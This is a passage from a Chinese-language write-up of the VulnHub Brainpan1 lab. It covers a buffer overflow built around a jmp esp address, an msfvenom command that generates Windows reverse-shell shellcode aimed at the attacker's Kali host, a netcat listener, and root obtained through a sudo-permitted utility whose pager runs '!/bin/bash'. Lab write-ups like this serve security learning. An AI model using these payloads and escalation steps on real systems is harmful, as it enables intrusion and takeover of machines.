+<h4 id="构造-EIP-指向-ESP"><a href="#构造-EIP-指向-ESP" class="headerlink" title="构造 EIP 指向 ESP"></a>构造 EIP 指向 ESP</h4><p>每次 esp 的地址是不固定的，那么我们需要使用 EIP 来指向一个 esp 的地址</p>
+<p>拿到 jmp esp 的操作码</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/28.png"></p>
+<h5 id="Immunity-Debugger-mona-py"><a href="#Immunity-Debugger-mona-py" class="headerlink" title="Immunity Debugger -&gt;mona.py"></a><font style="color:rgb(51, 51, 51);">Immunity Debugger -&gt;</font>mona.py</h5><p>无 rebase 无 safeSEH 无 ASLR 无 CFG 无 NX 无 OS Dll</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/29.png"></p>
+<p>通过字节码在 exe 找 jmp esp 的地址</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/30.png"></p>
+<p>地址：0x311712f3       “\xff\xe4”（jmp 的字节码）</p>
+<h6 id="构造-EIP-的内容："><a href="#构造-EIP-的内容：" class="headerlink" title="构造 EIP 的内容："></a>构造 EIP 的内容：</h6><p>在 exp 中的 EIP 位置，构造0x311712f3 地址，小端序–&gt;”\xf3\x12\x17\x31”</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/31.png"></p>
+<h4 id="构造-ESP-的-shellcode"><a href="#构造-ESP-的-shellcode" class="headerlink" title="构造 ESP 的 shellcode"></a>构造 ESP 的 shellcode</h4><p>Msfvenom（教程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48985780/article/details/121441548">https://blog.csdn.net/qq_48985780&#x2F;article&#x2F;details&#x2F;121441548</a>）</p>
+<p>-p 指定要使用的 payload</p>
+<p>-b 设定坏字节</p>
+<p>-e 指定编码器：shikata_ga_nai（绕过和免杀效果好。）</p>
+<p>-f c 指定输出格式为 c 代码</p>
+<p>LHOST 要写 kali 的 ip 地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">┌──(kali㉿kali)-[~/VulnHub/Brainpan1]<br>└─$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.169.17.136 LPORT=443 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f c<br><br></code></pre></td></tr></table></figure>
+
+<p>构造 exp：</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/32.png"></p>
+<p>最终 exp</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/33.png"></p>
+<h3 id="windows-获取反弹-shell"><a href="#windows-获取反弹-shell" class="headerlink" title="windows 获取反弹 shell"></a>windows 获取反弹 shell</h3><p>kali：sudo nc -lvnp 443 开启监听</p>
+<p>windows：运行 brainpan.exe 程序</p>
+<p>kali：发送 exp</p>
+<p>成功 getshell！</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/34.png"></p>
+<h2 id="brainpan-ova"><a href="#brainpan-ova" class="headerlink" title="brainpan.ova"></a>brainpan.ova</h2><p>linux 系统</p>
+<p>ip：192.168.17.144</p>
+<p>生成 linux 的 payload（这个程序运行之后是通过 9999 端口交互的，并且基于内存的利用都是通用的，可以忽略操作系统的概念，还有别的巴拉巴拉….）</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/35.png"></p>
+<p>针对靶机的 exp：</p>
+<p><img src="/../img/vulnhub-Brainpan1.md/36.png"></p>
+<h3 id="成功反弹-shell（低权限）！"><a href="#成功反弹-shell（低权限）！" class="headerlink" title="成功反弹 shell（低权限）！"></a>成功反弹 shell（低权限）！</h3><p><img src="/../img/vulnhub-Brainpan1.md/37.png"></p>
+<p>美化 shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/vulnhub-Brainpan1.md/38.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br><br>puck@brainpan:/home/puck$ sudo -l<br>sudo -l<br>Matching Defaults entries for puck on this host:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User puck may run the following commands on this host:<br>    (root) NOPASSWD: /home/anansi/bin/anansi_util<br>    <br>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util<br>sudo /home/anansi/bin/anansi_util<br>Usage: /home/anansi/bin/anansi_util [action]<br>Where [action] is one of:<br>  - network<br>  - proclist<br>  - manual [command]<br><br><br>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls    <br>sudo /home/anansi/bin/anansi_util manual ls<br>No manual entry for manual<br>WARNING: terminal is not fully functional<br>-  (press RETURN)<br>LS(1)                            User Commands                           LS(1)<br><br>NAME<br>       ls - list directory contents<br><br>SYNOPSIS<br>       ls [OPTION]... [FILE]...<br><br>DESCRIPTION<br>       List  information  about  the FILEs (the current directory by default).<br>       Sort entries alphabetically if none of -cftuvSUX nor --sort  is  speci‐<br>       fied.<br><br>       Mandatory  arguments  to  long  options are mandatory for short options<br>       too.<br><br>       -a, --all<br>              do not ignore entries starting with .<br><br>       -A, --almost-all<br>              do not list implied . and ..<br><br>       --author<br> Manual page ls(1) line 1 (press h for help or q to quit)!/bin/bash<br>!/bin/bash（经验！！！）<br><br>root@brainpan:/usr/share/man# <br><br>root@brainpan:/home/puck/web# ip -a<br>ip -a<br>Option &quot;-a&quot; is unknown, try &quot;ip -help&quot;.<br>root@brainpan:/home/puck/web# uname -a<br>uname -a<br>Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux<br>root@brainpan:/home/puck/web# <br><br><br><br><br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Vulnhub%E9%9D%B6%E5%9C%BA/" class="print-no-link">#Vulnhub靶场</a>
+      
+        <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%EF%BC%88%E6%9E%84%E9%80%A0-eip-%E6%8C%87%E5%90%91-esp%E3%80%81-esp-%E6%9E%84%E9%80%A0-shellcode%EF%BC%89/" class="print-no-link">#缓冲区溢出（构造 eip 指向 esp、 esp 构造 shellcode）</a>
+      
+        <a href="/tags/vlum-nmap%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B/" class="print-no-link">#vlum-nmap漏洞探测</a>
+      
+        <a href="/tags/wfuzz%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4/" class="print-no-link">#wfuzz目录爆破</a>
+      
+        <a href="/tags/msf-pattern/" class="print-no-link">#msf-pattern</a>
+      
+        <a href="/tags/badchars%E5%9D%8F%E5%AD%97%E8%8A%82/" class="print-no-link">#badchars坏字节</a>
+      
+        <a href="/tags/Immunity-Debugger-mona-py/" class="print-no-link">#Immunity Debugger ->mona.py</a>
+      
+        <a href="/tags/Msfvenom%E6%9E%84%E9%80%A0shellcode-bin-bash%EF%BC%88%E6%8F%90%E6%9D%83%EF%BC%89/" class="print-no-link">#Msfvenom构造shellcode!/bin/bash（提权）</a>
+      
+        <a href="/tags/ret2libc/" class="print-no-link">#ret2libc</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>vulnhub-brainpan1</div>
+      <div>https://jimi-lab.github.io/2025/06/02/vulnhub-Brainpan1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Jimi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/29/vulnhub-deathstar_1/" title="vulnhub:deathstar_1">
+                        <span class="hidden-mobile">vulnhub:deathstar_1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments">
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Jimi-Lab/Jimi-Lab.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      
+<a href="https://github.com/Jimi-Lab" target="_blank" rel="nofollow noopener"><span>@Jimi.github</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
